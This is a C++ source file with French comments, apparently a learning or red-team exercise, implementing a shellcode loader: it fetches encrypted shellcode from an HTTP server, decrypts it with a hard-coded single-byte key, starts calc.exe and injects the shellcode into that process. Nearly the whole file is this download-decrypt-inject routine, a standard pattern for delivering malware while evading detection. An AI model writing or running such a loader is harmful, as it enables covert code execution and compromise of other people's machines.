#include <iostream> 
#include <tchar.h>

#include "Decrypt.h" 
#include "HTTPClient.h" 
#include "Memory.h" 


int main() {
    // Etape 2 : R�cup�ration du shellcode chiffr� du serveur HTTP 
    DWORD payloadSize = 0;
    PBYTE payload = getHTTPPayload(payloadSize);

    if (!payload) {
        std::cerr << "�chec de la r�cup�ration du shellcode." << std::endl;
        return 1;
    }

    std::cout << "Shellcode chiffr� :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;   

    // Fin de la r�cup�ration du shellcode chiffr� du serveur http
    

    // Etape 3 : D�chiffrement du shellcode 
     // Cl� de d�chiffrement 
    unsigned char decryptionKey = 0xAA;

    // D�chiffrement du shellcode 

    decrypt(payload, payloadSize, decryptionKey);

    std::cout << "Shellcode d�chiffr� :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    // Fin du d�chiffrement du shellcode 

     // Etape 4 : Injection du shellcode
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    const TCHAR* target = _T("c:\\WINDOWS\\system32\\calc.exe");

    if (!CreateProcess(
        target,
        NULL,
        NULL,            // S�curit� pour le processus
        NULL,
        FALSE,           // Ne pas h�riter des handles
        0,               // Aucune option particuli�re
        NULL,            // Variables d'environnement (ici, aucune)
        NULL,            // Dossier de travail actuel (ici, aucun)
        &si,             // Structure STARTUPINFO
        &pi              // Structure PROCESS_INFORMATION
    )) {
        printf("CreateProcess failed : erreur %d \n ", GetLastError());
        return 1;
    }
    DWORD targetPid = pi.dwProcessId;
    if (!injectShellcode(payload, payloadSize, targetPid)) {
        std::cout << "�chec de l'injection dans le processus." << std::endl;
        return 1;
    }
    else {
        std::cout << "Injection r�ussie !" << std::endl;
    }

    // Fin de l'injection du shellcode

    LocalFree(payload);
    return 0;
}